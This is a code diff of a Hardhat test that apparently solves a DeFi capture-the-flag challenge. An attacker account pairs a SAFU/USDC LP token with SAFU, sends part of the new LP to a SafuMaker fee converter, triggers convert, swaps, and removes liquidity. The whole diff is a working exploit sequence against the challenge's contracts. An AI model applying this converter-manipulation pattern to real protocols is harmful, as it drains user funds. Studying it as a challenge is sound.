@@ -127,51 +127,59 @@ it("solves the challenge", async function () {
     (await ethers.provider.getBlock('latest')).timestamp*2
   )  
   // quick read over the solution, was in the right direction. just getting stuck.
+  // overview:
+  /** 
+   * √ get usdc-safu lp 
+   * √ generate safuLP-safu pair
+   * send this liquidity to safuMaker
+   * 
+
+   * √ convert safu - safuLP
+   * router.swapETFT 
+   * remove usdc-safu liquidity 
+   */
   await safuRouter.connect(attacker).addLiquidity(
     safuPair.address,
     safu.address,
-    precision.mul(1),
-    100,
+    precision.mul(10),
+    1000,
     0,
     0,
     await attacker.getAddress(),
     (await ethers.provider.getBlock('latest')).timestamp*2
   )  
+  
+  let lpAddress = await safuFactory.getPair(safuPair.address, safu.address)
+  let lpPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, attacker) // admin required for attach
+  let spoofuPair = lpPairFactory.attach(lpAddress)
+  await spoofuPair.connect(attacker).approve(safuRouter.address,ethers.constants.MaxUint256)
 
+  const pwnLiquidity = await spoofuPair.connect(attacker).balanceOf(await attacker.getAddress());
+  // console.log(pwnLiquidity.toString())
+  // console.log(precision.div(pwnLiquidity).toString())
 
-  const pwnLiquidity = await safuPair.connect(attacker).balanceOf(await attacker.getAddress());
-  console.log(pwnLiquidity.toString())
-  // console.log(precision.div(pwnLiquidity))
+  await spoofuPair.connect(attacker).transfer(safuMaker.address, pwnLiquidity.div(10)) // 10% of LP
+  await safuMaker.connect(attacker).convert(safuPair.address, safu.address)
 
-    // await safuRouter.connect(attacker).addLiquidity( // creates pair
-    //   safu.address,
-    //   spoof.address,
-    //   precision.mul(1),
-    //   precision.div(1000000),
-    //   0,
-    //   0,
-    //   await attacker.getAddress(),
-    //   (await ethers.provider.getBlock('latest')).timestamp*2
-    // ) 
-    
-    // getting the USDC-SPOOFU trading pair
-    // let pairAddress = await safuFactory.getPair(safu.address, spoof.address)
-    // let spoofuPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, attacker) // admin required for attach
-    // let spoofuPair = spoofuPairFactory.attach(pairAddress)
-    
-    // const [usdcReserve, spoofuReserve] = await spoofuPair.connect(attacker).getReserves();
-    // console.log('Spoofed Price (usd):', spoofuReserve/ usdcReserve)
-    // console.log('Spoofed Price (usd):', usdcReserve/spoofuReserve)
-    
-    // const ts = await spoofuPair.connect(attacker).totalSupply();
-    // await spoofuPair.connect(attacker).transfer(safuMaker.address, precision.div(pwnLiquidity).div(10)) // 1% of LP
-    // console.log(parseInt(precision.div(ts).div(10).toString()))
-    // console.log(parseInt(precision.div(ts).toString()))
+  await safuRouter.connect(attacker).swapExactTokensForTokens(
+    precision.mul(1),
+    0,
+    [safu.address, safuPair.address],
+    await attacker.getAddress(),
+    (await ethers.provider.getBlock('latest')).timestamp*2
+  )
 
-    // let ffFactory = await ethers.getContractFactory('SafuMakerV2')
-    // let freeLunch = ffFactory.attach(safuMaker.address);
+  // removing liquidity for the safuPair LP - receive USDC & SAFU
+  await safuRouter.connect(attacker).removeLiquidity(
+    usdc.address,
+    safu.address,
+    await safuPair.balanceOf(await attacker.getAddress()),
+    0,
+    0,
+    await attacker.getAddress(),
+    (await ethers.provider.getBlock('latest')).timestamp*2
+  )
 
-    // await freeLunch.connect(attacker).convert(safu.address, safuPair.address)
 
 });
 
